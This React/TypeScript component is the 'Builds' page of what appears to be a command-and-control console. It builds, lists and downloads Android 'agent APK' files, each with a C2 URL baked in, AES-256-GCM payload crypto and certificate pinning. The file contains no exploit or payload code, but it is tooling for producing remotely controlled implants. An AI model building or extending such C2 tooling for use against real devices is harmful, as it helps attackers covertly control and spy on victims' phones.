import { useCallback, useEffect, useState } from "react";
import { toast } from "sonner";
import { CheckCircle2, Download, Loader2, TriangleAlert } from "lucide-react";
import { ApiError, downloadFile, listBuilds, runBuild, type BuildConfig, type BuildEnv, type BuildRecord } from "@/lib/api";
import { fmtAge, fmtBytes } from "@/lib/format";
import { useConsole } from "@/state";
import { Badge } from "@/components/ui/badge";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { DataTable, type Column } from "@/components/data-table";

function Group({ title, hint, children }: { title: string; hint?: string; children: React.ReactNode }) {
  return (
    <section className="space-y-1">
      <div className="flex items-baseline gap-3">
        <h2 className="font-mono text-[11px] uppercase tracking-wider text-muted-foreground">{title}</h2>
        {hint && <p className="text-[11px] text-muted-foreground/70">{hint}</p>}
      </div>
      <div className="rounded-lg border divide-y divide-border/60">{children}</div>
    </section>
  );
}

function Row({ label, children }: { label: string; children: React.ReactNode }) {
  return (
    <div className="flex flex-col gap-1 px-4 py-2.5 md:flex-row md:items-center md:gap-4">
      <span className="w-48 shrink-0 font-mono text-[11px] uppercase tracking-wider text-muted-foreground">{label}</span>
      <div className="min-w-0 flex-1 font-mono text-xs break-words">{children}</div>
    </div>
  );
}

function parseBuiltAt(s: string): Date | null {
  const m = /^(\d{4})(\d{2})(\d{2})T(\d{2})(\d{2})(\d{2})Z$/.exec(s);
  if (!m) return null;
  const d = new Date(Date.UTC(Number(m[1]), Number(m[2]) - 1, Number(m[3]), Number(m[4]), Number(m[5]), Number(m[6])));
  return Number.isNaN(d.getTime()) ? null : d;
}

function fmtBuilt(s: string): string {
  const d = parseBuiltAt(s);
  if (!d) return s;
  const age = Math.max(0, Math.floor(Date.now() / 1000 - d.getTime() / 1000));
  return `${d.toLocaleString(undefined, { dateStyle: "medium", timeStyle: "short" })} (${fmtAge(age)} ago)`;
}

const columns: Column[] = [
  {
    key: "file",
    head: "File",
    class: "font-mono text-xs",
    value: (r) => String(r.file ?? ""),
    render: (r) => {
      const b = r as unknown as BuildRecord;
      return (
        <span className="inline-flex min-w-0 max-w-full items-center gap-2">
          <span className="truncate">{b.file}</span>
          {b.latest && <Badge className="font-mono text-[10px] shrink-0">current</Badge>}
        </span>
      );
    },
  },
  {
    key: "built_at",
    head: "Built",
    class: "font-mono text-xs text-muted-foreground whitespace-nowrap",
    value: (r) => String(r.built_at ?? ""),
    render: (r) => fmtBuilt(String((r as unknown as BuildRecord).built_at ?? "")),
  },
  {
    key: "c2_url",
    head: "C2 URL",
    class: "font-mono text-xs",
    value: (r) => String(r.c2_url ?? ""),
    render: (r) => {
      const url = String((r as unknown as BuildRecord).c2_url ?? "");
      return url === "" ? <span className="text-muted-foreground">adb-direct</span> : <span className="break-all">{url}</span>;
    },
  },
  {
    key: "enc",
    head: "Crypto",
    class: "font-mono text-xs",
    value: (r) => ((r as unknown as BuildRecord).enc ? "AES-256-GCM" : "off"),
    render: (r) => ((r as unknown as BuildRecord).enc ? "AES-256-GCM" : "off"),
  },
  {
    key: "pin_set",
    head: "Pin",
    class: "font-mono text-xs",
    value: (r) => ((r as unknown as BuildRecord).pin_set ? "set" : "-"),
    render: (r) => ((r as unknown as BuildRecord).pin_set ? "set" : "-"),
  },
  {
    key: "size",
    head: "Size",
    class: "text-right font-mono text-xs",
    value: (r) => Number((r as unknown as BuildRecord).size ?? 0),
    render: (r) => fmtBytes(Number((r as unknown as BuildRecord).size ?? 0)),
  },
  {
    key: "sha256",
    head: "SHA256",
    class: "font-mono text-xs text-muted-foreground",
    value: (r) => String(r.sha256 ?? ""),
    render: (r) => {
      const sha = String((r as unknown as BuildRecord).sha256 ?? "");
      return <span title={sha}>{sha.slice(0, 12)}</span>;
    },
  },
];

export default function BuildsView() {
  const { snapshot } = useConsole();
  const [builds, setBuilds] = useState<BuildRecord[] | null>(null);
  const [next, setNext] = useState<BuildConfig | null>(null);
  const [env, setEnv] = useState<BuildEnv | null>(null);
  const [loading, setLoading] = useState(true);
  const [building, setBuilding] = useState(false);
  const [error, setError] = useState<string | null>(null);
  const [log, setLog] = useState<string[]>([]);
  const [urlInput, setUrlInput] = useState("");
  const [startedAt, setStartedAt] = useState<number | null>(null);
  const [elapsed, setElapsed] = useState(0);
  const [resultC2, setResultC2] = useState<string | null>(null);
  const [resultOk, setResultOk] = useState<boolean | null>(null);
  const [buildError, setBuildError] = useState<string | null>(null);

  const load = useCallback(async () => {
    setLoading(true);
    setError(null);
    try {
      const r = await listBuilds();
      setBuilds(r.builds);
      setNext(r.next);
      setEnv(r.env);
      if (r.building) {
        setBuilding(true);
        setStartedAt((prev) => prev ?? Date.now());
      }
    } catch (e) {
      setError(e instanceof Error ? e.message : String(e));
    } finally {
      setLoading(false);
    }
  }, []);

  useEffect(() => {
    load();
  }, [load]);

  useEffect(() => {
    if (!building || startedAt === null) return;
    const t = window.setInterval(() => setElapsed(Math.floor((Date.now() - startedAt) / 1000)), 500);
    return () => window.clearInterval(t);
  }, [building, startedAt]);

  const startBuild = async () => {
    setBuilding(true);
    setStartedAt(Date.now());
    setElapsed(0);
    setLog([]);
    setResultC2(null);
    setResultOk(null);
    setBuildError(null);
    try {
      const r = await runBuild(urlInput.trim());
      setLog(Array.isArray(r.log) ? r.log : []);
      setResultC2(r.c2_url);
      setResultOk(r.ok);
      if (r.builds) setBuilds(r.builds);
      if (r.next) setNext(r.next);
      if (r.ok) toast.success("build finished");
      else {
        setBuildError("build failed");
        toast.error("build failed");
      }
    } catch (e) {
      const payload = e instanceof ApiError ? (e.payload as { log?: unknown; builds?: unknown } | undefined) : undefined;
      if (payload && Array.isArray(payload.log)) {
        setLog(payload.log.filter((l): l is string => typeof l === "string"));
      }
      if (payload && Array.isArray(payload.builds)) {
        setBuilds(payload.builds as BuildRecord[]);
      }
      const msg = e instanceof Error ? e.message : String(e);
      setBuildError(msg);
      setResultOk(false);
      toast.error(msg);
    } finally {
      setBuilding(false);
    }
  };

  const tunnelUrl = snapshot?.server.tunnel_url ?? null;
  const showResult = resultOk !== null || buildError !== null || log.length > 0;

  return (
    <div className="max-w-[1100px] space-y-6">
      <Group title="Next build" hint="config the next APK would bake">
        {loading || builds === null ? (
          <p className="text-xs text-muted-foreground font-mono py-8 text-center">loading builds…</p>
        ) : error ? (
          <div className="flex flex-col items-center gap-3 py-10 px-6 text-center">
            <p className="text-sm text-red-500/90 max-w-md break-words">{error}</p>
            <Button size="sm" variant="outline" onClick={load} disabled={loading}>Retry</Button>
          </div>
        ) : next === null ? (
          <p className="text-xs text-muted-foreground font-mono py-8 text-center">next build config unavailable</p>
        ) : (
          <>
            <Row label="C2 URL">
              {next.c2_url === "" ? (
                <span className="text-muted-foreground">adb-direct - no C2 endpoint</span>
              ) : (
                next.c2_url
              )}
            </Row>
            <Row label="Payload crypto">{next.enc ? "AES-256-GCM" : "off"}</Row>
            <Row label="Key fingerprint">
              {next.psk_fp === null ? <span className="text-muted-foreground/50">not set</span> : next.psk_fp}
            </Row>
            <Row label="Cert pin">{next.pin_available ? "available" : "not available"}</Row>
            <Row label="Signer">
              {next.signer_sha256 === null ? (
                <span className="text-muted-foreground/50">not set</span>
              ) : (
                next.signer_sha256.slice(0, 16) + "…"
              )}
            </Row>
          </>
        )}
      </Group>

      <section className="space-y-1" aria-busy={building}>
        <div className="flex items-baseline gap-3">
          <h2 className="font-mono text-[11px] uppercase tracking-wider text-muted-foreground">Build</h2>
        </div>
        <div className="rounded-lg border px-4 py-3 space-y-3">
          <div className="space-y-1.5">
            <label htmlFor="build-c2-url" className="font-mono text-[11px] uppercase tracking-wider text-muted-foreground">
              C2 URL
            </label>
            <Input
              id="build-c2-url"
              value={urlInput}
              onChange={(e) => setUrlInput(e.target.value)}
              placeholder={tunnelUrl || "https://c2.yourdomain.com"}
              className="font-mono text-xs"
              disabled={building}
            />
            <p className="text-[11px] text-muted-foreground">
              Leave the URL empty to use the tunnel the server is currently exposing.
            </p>
          </div>
          {env !== null && env.missing.length > 0 && (
            <div className="flex gap-2 rounded-md border border-border bg-card px-3 py-2">
              <TriangleAlert className="size-4 shrink-0 text-muted-foreground" />
              <p className="font-mono text-xs text-muted-foreground">
                Missing build setup: {env.missing.join(", ")}. The build can still be attempted, the server validates.
              </p>
            </div>
          )}
          <div className="flex items-center gap-3">
            <Button onClick={startBuild} disabled={building}>
              {building && <Loader2 className="size-3.5 mr-1 animate-spin" />}
              {building ? `Building - ${elapsed}s` : "Build agent APK"}
            </Button>
          </div>
          {showResult && (
            <div aria-live="polite" className="space-y-2">
              {resultOk === true && (
                <p className="flex items-center gap-2 font-mono text-xs">
                  <CheckCircle2 className="size-4 shrink-0" />
                  <span className="break-all">build finished - {resultC2 === "" || resultC2 === null ? "adb-direct" : resultC2}</span>
                </p>
              )}
              {resultOk === false && (
                <p className="font-mono text-xs text-red-500/90 break-words">{buildError ?? "build failed"}</p>
              )}
              {log.length > 0 && (
                <pre className="font-mono text-xs whitespace-pre-wrap rounded-md border border-border bg-card px-3 py-2">
                  {log.slice(-12).join("\n")}
                </pre>
              )}
            </div>
          )}
        </div>
      </section>

      <section className="space-y-1">
        <div className="flex items-baseline gap-3">
          <h2 className="font-mono text-[11px] uppercase tracking-wider text-muted-foreground">History</h2>
        </div>
        <div className="rounded-lg border bg-card overflow-x-auto">
          {error && builds === null ? (
            <div className="flex flex-col items-center gap-3 py-10 px-6 text-center">
              <p className="text-sm text-red-500/90 max-w-md break-words">{error}</p>
              <Button size="sm" variant="outline" onClick={load} disabled={loading}>Retry</Button>
            </div>
          ) : builds === null ? (
            <p className="text-xs text-muted-foreground font-mono py-8 text-center">loading builds…</p>
          ) : builds.length === 0 ? (
            <p className="text-xs text-muted-foreground font-mono py-8 text-center">no builds yet - build an APK to see it here</p>
          ) : (
            <DataTable
              columns={columns}
              rows={builds.map((b) => ({ ...b }))}
              empty="no builds yet - build an APK to see it here"
              actions={(r) => {
                const b = r as unknown as BuildRecord;
                return (
                  <Button
                    variant="ghost"
                    size="sm"
                    aria-label={`download ${b.file}`}
                    onClick={async () => {
                      try {
                        await downloadFile(b.download_url, b.file);
                        toast.success(`saved ${b.file}`);
                      } catch (e) {
                        toast.error(e instanceof Error ? e.message : "download failed");
                      }
                    }}
                  >
                    <Download className="size-3.5" />
                  </Button>
                );
              }}
            />
          )}
        </div>
      </section>
    </div>
  );
}
